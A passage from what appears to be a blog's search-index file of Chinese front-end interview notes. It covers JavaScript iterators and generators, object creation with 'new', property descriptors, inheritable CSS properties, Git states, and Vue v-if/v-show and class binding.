punctuation">(</span><span class="token punctuation">)</span>iterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// {value: 1, done: false}</span>iterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// {value: 2, done: false}</span>iterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// {value: 3, done: false}</span>iterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// {value: undefined, done: true}</span></code></pre><p>for..of其实就是去调用iterator接口</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 迭代器模式</span><span class="token comment" spellcheck="true">// 场景：协同开发一个任务清单</span><span class="token comment" spellcheck="true">// a的代码</span><span class="token keyword">const</span> todos <span class="token operator">=</span> <span class="token punctuation">{</span>    life<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'吃饭'</span><span class="token punctuation">,</span> <span class="token string">'睡觉'</span><span class="token punctuation">,</span> <span class="token string">'打豆豆'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    learn<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'语文'</span><span class="token punctuation">,</span> <span class="token string">'数学'</span><span class="token punctuation">,</span> <span class="token string">'外语'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    work<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'喝茶'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// b的代码,需要知道对象结构</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> item <span class="token keyword">of</span> todos<span class="token punctuation">.</span>life<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> item <span class="token keyword">of</span> todos<span class="token punctuation">.</span>learn<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> item <span class="token keyword">of</span> todos<span class="token punctuation">.</span>work<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 这时如果我在a代码的todos对象中加一个接口</span>each<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>callback<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> all <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>life<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>learn<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>work<span class="token punctuation">)</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">const</span> item <span class="token keyword">of</span> all<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">callback</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// b中就可以这样调用</span>todo<span class="token punctuation">.</span><span class="token function">each</span><span class="token punctuation">(</span>item <span class="token operator">=</span><span class="token operator">></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>迭代器实现：对外提供统一遍历接口</p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> todos <span class="token operator">=</span> <span class="token punctuation">{</span>    life<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'吃饭'</span><span class="token punctuation">,</span> <span class="token string">'睡觉'</span><span class="token punctuation">,</span> <span class="token string">'打豆豆'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    learn<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'语文'</span><span class="token punctuation">,</span> <span class="token string">'数学'</span><span class="token punctuation">,</span> <span class="token string">'外语'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    work<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'喝茶'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span>Symbol<span class="token punctuation">.</span>iterator<span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> all <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token keyword">this</span><span class="token punctuation">.</span>life<span class="token punctuation">,</span> <span class="token operator">...</span><span class="token keyword">this</span><span class="token punctuation">.</span>learn<span class="token punctuation">,</span> <span class="token operator">...</span><span class="token keyword">this</span><span class="token punctuation">.</span>work<span class="token punctuation">]</span>        <span class="token keyword">let</span> index <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">return</span> <span class="token punctuation">{</span>            next<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token punctuation">{</span>                    value<span class="token punctuation">:</span> all<span class="token punctuation">[</span>index<span class="token punctuation">]</span>                    done<span class="token punctuation">:</span> index<span class="token operator">++</span> <span class="token operator">>=</span> all<span class="token punctuation">.</span>length                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">const</span> item <span class="token keyword">of</span> todos<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>生成器实现迭代器</p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> todos <span class="token operator">=</span> <span class="token punctuation">{</span>    life<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'吃饭'</span><span class="token punctuation">,</span> <span class="token string">'睡觉'</span><span class="token punctuation">,</span> <span class="token string">'打豆豆'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    learn<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'语文'</span><span class="token punctuation">,</span> <span class="token string">'数学'</span><span class="token punctuation">,</span> <span class="token string">'外语'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    work<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'喝茶'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span>Symbol<span class="token punctuation">.</span>iterator<span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> all <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token keyword">this</span><span class="token punctuation">.</span>life<span class="token punctuation">,</span> <span class="token operator">...</span><span class="token keyword">this</span><span class="token punctuation">.</span>learn<span class="token punctuation">,</span> <span class="token operator">...</span><span class="token keyword">this</span><span class="token punctuation">.</span>work<span class="token punctuation">]</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">const</span> item <span class="token keyword">of</span> all<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">yield</span> item        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">const</span> item <span class="token keyword">of</span> todos<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h2 id="场景题：参数拼接"><a href="#场景题：参数拼接" class="headerlink" title="场景题：参数拼接"></a>场景题：参数拼接</h2><ul><li>如何保证有这个参数时拼接，没有的时候不拼接呢</li></ul><pre class=" language-js"><code class="language-js">    <span class="token keyword">let</span> options <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span>        <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token punctuation">,</span>        <span class="token string">'sex'</span><span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>sex      <span class="token punctuation">}</span>      <span class="token keyword">let</span> paramsurl <span class="token operator">=</span> <span class="token string">''</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">const</span> key <span class="token keyword">in</span> options<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> value <span class="token operator">=</span> options<span class="token punctuation">[</span>key<span class="token punctuation">]</span>        value <span class="token operator">&amp;&amp;</span>          <span class="token punctuation">(</span>paramsurl <span class="token operator">+</span><span class="token operator">=</span> paramsurl <span class="token operator">?</span> <span class="token template-string"><span class="token string">`&amp;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>key<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>value<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span> <span class="token punctuation">:</span> <span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>key<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>value<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span>      <span class="token punctuation">}</span></code></pre><h2 id="css可继承的属性"><a href="#css可继承的属性" class="headerlink" title="css可继承的属性"></a>css可继承的属性</h2><ul><li>字体系列属性</li></ul><blockquote><p>font-family：字体系列</p><p>font-weight：字体的粗细</p><p>font-size：字体的大小</p><p>font-style：字体的风格</p></blockquote><ul><li>文本系列属性</li></ul><blockquote><p>text-indent：文本缩进</p><p>text-align：文本水平对齐</p><p>line-height：行高</p><p>word-spacing：单词之间的间距</p><p>letter-spacing：中文或者字母之间的间距</p><p>text-transform：控制文本大小写（就是uppercase、lowercase、capitalize这三个）</p><p>color：文本颜色</p></blockquote><ul><li>元素可见性</li></ul><blockquote><p>visibility：控制元素显示隐藏　　</p></blockquote><ul><li>列表布局属性</li></ul><blockquote><p>list-style：列表风格，包括list-style-type、list-style-image等</p></blockquote><ul><li>光标属性</li></ul><blockquote><p>cursor：光标显示为何种形态</p></blockquote><h2 id="git有几种状态"><a href="#git有几种状态" class="headerlink" title="git有几种状态"></a>git有几种状态</h2><p>Git 有三种状态，你的文件可能处于其中之一：</p><ul><li><strong>已提交（committed）</strong>：数据已经安全的保存在本地数据库中。</li><li><strong>已修改（modified）</strong>：已修改表示修改了文件，但还没保存到数据库中。</li><li><strong>已暂存（staged）</strong>：表示对一个已修改文件的当前版本做了标记，使之包含在下次提交的快照中。</li></ul><p>由此引入 Git 项目的三个工作区域的概念：</p><ul><li><strong>Git 仓库(.git directoty)</strong></li><li><strong>工作目录(Working Directory)</strong></li><li><strong>暂存区域(Staging Area)</strong></li></ul><h4 id="基本的-Git-工作流程如下："><a href="#基本的-Git-工作流程如下：" class="headerlink" title="基本的 Git 工作流程如下："></a>基本的 Git 工作流程如下：</h4><ul><li>在工作目录中修改文件。</li><li>暂存文件，将文件的快照放入暂存区域。</li><li>提交更新，找到暂存区域的文件，将快照永久性存储到 Git 仓库目录</li></ul><hr><ul><li>Workspace：工作区</li><li>Index / Stage：暂存区</li><li>Repository：仓库区（或本地仓库）</li><li>Remote：远程仓库</li></ul><h2 id="简述-new-一个对象的过程"><a href="#简述-new-一个对象的过程" class="headerlink" title="简述 new 一个对象的过程"></a>简述 new 一个对象的过程</h2><p>简述new一个对象的过程：</p><blockquote><p>创造一个新的空对象<br>新对象的<em>proto</em>指向构造函数的原型对象<br>构造函数的this指向正在创建的新对象，并执行构造函数的代码，向新对象中添加属性和方法。<br>返回新对象地址</p></blockquote><pre class=" language-js"><code class="language-js">        <span class="token keyword">function</span> <span class="token function">book</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name            <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> value        <span class="token punctuation">}</span>        <span class="token keyword">let</span> book1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">book</span><span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">,</span><span class="token string">"100"</span><span class="token punctuation">)</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>book1<span class="token punctuation">)</span>        <span class="token keyword">function</span> <span class="token function">myNew</span><span class="token punctuation">(</span>constructor<span class="token punctuation">,</span><span class="token operator">...</span>args<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            constructor<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span><span class="token operator">...</span>args<span class="token punctuation">)</span>            obj<span class="token punctuation">.</span>__proto__ <span class="token operator">=</span> constructor<span class="token punctuation">.</span>prototype            <span class="token keyword">return</span> obj        <span class="token punctuation">}</span>        <span class="token keyword">let</span> book2 <span class="token operator">=</span> <span class="token function">myNew</span><span class="token punctuation">(</span>book<span class="token punctuation">,</span><span class="token string">"def"</span><span class="token punctuation">,</span><span class="token string">"200"</span><span class="token punctuation">)</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>book2<span class="token punctuation">)</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>book2 <span class="token keyword">instanceof</span> <span class="token class-name">book</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//true</span></code></pre><h3 id="一道面试题"><a href="#一道面试题" class="headerlink" title="一道面试题"></a>一道面试题</h3><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">ClassA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'classA'</span><span class="token punctuation">}</span><span class="token keyword">const</span> classA <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassA</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>ClassA<span class="token punctuation">.</span>prototype <span class="token operator">=</span>classA<span class="token punctuation">.</span>__proto__ <span class="token operator">=</span>classA <span class="token keyword">instanceof</span> <span class="token class-name">ClassA</span></code></pre><ul><li>new 出来的实例 this 指向哪     (新实例)</li><li>怎么修改 new 出来的 this 的指向（return一个新对象）         </li><li>ClassA.prototype == classA.proto</li><li>原型链讲一下     </li><li>instanceof 什么时候返回 true，什么时候返回 false     </li><li>怎么让 classA instanceof ClassA 返回 false  ( 改变ClassA.prototype或classA.proto)</li></ul><h2 id="数据属性与访问器属性"><a href="#数据属性与访问器属性" class="headerlink" title="数据属性与访问器属性"></a>数据属性与访问器属性</h2><p>首先明确，这两个概念是针对数据来定义的。</p><h4 id="数据属性"><a href="#数据属性" class="headerlink" title="数据属性"></a>数据属性</h4><p>数据属性（property）用于实现JavaScript引擎，是属性(property)的内部值，它包含一个数据值的位置。有如下4种行为特性。</p><ul><li>[[Configurable]]：能否被delete删除属性重新定义</li><li>[[Enumerable]]：能否被for-in枚举</li><li>[[Writable]]：能否修改属性值</li><li>[[Value]]：数据的数据值</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> person <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>person<span class="token punctuation">,</span><span class="token string">"name"</span><span class="token punctuation">,</span><span class="token punctuation">{</span>    writable<span class="token punctuation">:</span><span class="token boolean">false</span>   <span class="token comment" spellcheck="true">//不可修改属性</span>    value<span class="token punctuation">:</span><span class="token string">"abc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>person<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//abc</span>person<span class="token punctuation">.</span>name <span class="token operator">=</span> bcdconsole<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>person<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//abc</span></code></pre><h4 id="访问器属性"><a href="#访问器属性" class="headerlink" title="访问器属性"></a>访问器属性</h4><p>访问器属性主要由setter和getter函数组成，包含如下4个特性：</p><ul><li>[[Configurable]]：能否被delete删除属性重新定义。默认值：true</li><li>[[Enumerable]]：能否被for-in枚举。默认值：true</li><li>[[Get]]：读取属性值。默认值：undefined</li><li>[[Set]]：写入属性值。默认值：undefined</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> book <span class="token operator">=</span> <span class="token punctuation">{</span>    _year<span class="token punctuation">:</span><span class="token number">2004</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//_year前面的下划线是一种常用的记号，用于表示只能通过对象方法访问的属性。</span>    edition<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">}</span>Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>book<span class="token punctuation">,</span><span class="token string">"year"</span><span class="token punctuation">,</span><span class="token punctuation">{</span>    <span class="token keyword">get</span><span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_year    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token keyword">set</span><span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>newValue<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>newValue<span class="token operator">></span><span class="token number">2004</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>_year <span class="token operator">=</span> newValue            <span class="token keyword">this</span><span class="token punctuation">.</span>edition <span class="token operator">+</span><span class="token operator">=</span> newValue<span class="token number">-2004</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>book<span class="token punctuation">.</span>year <span class="token operator">=</span> <span class="token number">2005</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>book<span class="token punctuation">.</span>edition<span class="token punctuation">)</span></code></pre><p>其实<code>_year</code>和<code>year</code>是两个属性，<code>_year</code>是数据属性，<code>year</code>是访问器属性，<code>_year</code>为内部使用的，<code>year</code>为外部使用的。</p><p>如果都改为year，调用book.year会报错，因为这句话既可以输出数据属性，也可以调用访问器属性，产生冲突。</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>面试题（八）</title>
      <link href="2018/08/03/%E9%9D%A2%E8%AF%95-%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%88%E5%85%AB%EF%BC%89/"/>
      <url>2018/08/03/%E9%9D%A2%E8%AF%95-%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%88%E5%85%AB%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li>v-show 与 v-if 区别</li><li>动态绑定class的方法</li><li>v-model是怎么实现的</li><li>Sass与Stylus的常见语法</li><li>小程序的页面栈与生命周期</li><li>看代码说输出</li><li>package.json和package-lock.json</li><li>npm nrm yarn</li><li>什么是node-sass</li><li>封装小程序分享参数,获取参数</li><li>url编码与解码</li></ul><h2 id="v-show-与-v-if-区别"><a href="#v-show-与-v-if-区别" class="headerlink" title="v-show 与 v-if 区别"></a>v-show 与 v-if 区别</h2><p>相同点：v-if与v-show都可以动态控制dom元素显示隐藏</p><p>不同点：v-if显示隐藏是将dom元素整个添加或删除，而v-show隐藏则是为该元素添加css–display:none，dom元素还在。</p><pre class=" language-html"><code class="language-html">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>app<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">v-if</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>isIf<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>我是v-if<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">v-show</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>isShow<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>我是v-show<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>vue.min.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token keyword">let</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            el<span class="token punctuation">:</span><span class="token string">'#app'</span><span class="token punctuation">,</span>            data<span class="token punctuation">:</span><span class="token punctuation">{</span>                isIf<span class="token punctuation">:</span><span class="token boolean">true</span><span class="token punctuation">,</span>                isShow<span class="token punctuation">:</span><span class="token boolean">false</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p><strong>性能消耗：</strong>v-if有更高的切换消耗；v-show有更高的初始渲染消耗；</p><p><strong>使用场景：</strong>v-if适合运营条件不大可能改变；v-show适合频繁切换。</p><p>对于管理系统的权限列表的展示，这里可以使用V-if来渲染,对于前台页面的数据展示，这里推荐使用V-show </p><h2 id="动态绑定class的方法"><a href="#动态绑定class的方法" class="headerlink" title="动态绑定class的方法"></a>动态绑定class的方法</h2><h3 id="（1）对象语法"><a href="#（1）对象语法" class="headerlink" title="（1）对象语法"></a>（1）对象语法</h3><p>给v-bind:class 设置一个<strong>对象</strong>，可以动态地切换class，如下</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">:class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{<span class="token punctuation">'</span>active<span class="token punctuation">'</span>:isActive}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        el<span class="token punctuation">:</span><span class="token string">'#app'</span><span class="token punctuation">,</span>        data<span class="token punctuation">:</span><span class="token punctuation">{</span>            isActive<span class="token punctuation">:</span><span class="token boolean">true</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>最终渲染结果为：<code>&lt;div class=&quot;active&quot;&gt;\&lt;/div&gt;</code></p><p>v-bind就是<strong>用于绑定数据和元素属性的</strong> </p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name"><span class="token namespace">v-bind:</span>href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>click me<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        el<span class="token punctuation">:</span><span class="token string">'.app'</span><span class="token punctuation">,</span>        data<span class="token punctuation">:</span><span class="token punctuation">{</span>            url<span class="token punctuation">:</span><span class="token string">"https://www.baidu.com"</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>当然对象中也可以传入多个属性</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">:class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{<span class="token punctuation">'</span>active<span class="token punctuation">'</span>:isActive,<span class="token punctuation">'</span>error<span class="token punctuation">'</span>:isError}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--当值均为true时--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>active error<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><h3 id="（2）直接设置为对象"><a href="#（2）直接设置为对象" class="headerlink" title="（2）直接设置为对象"></a>（2）直接设置为对象</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">:class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>classObject<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>data: {  classObject: {    active: true,  }}</code></pre><h3 id="（3）数组方法"><a href="#（3）数组方法" class="headerlink" title="（3）数组方法"></a>（3）数组方法</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">:class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>[activeClass, errorClass]<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> data:{      activeClass: "active",      errorClass: "disActive" },渲染为<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>active disActive<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><h3 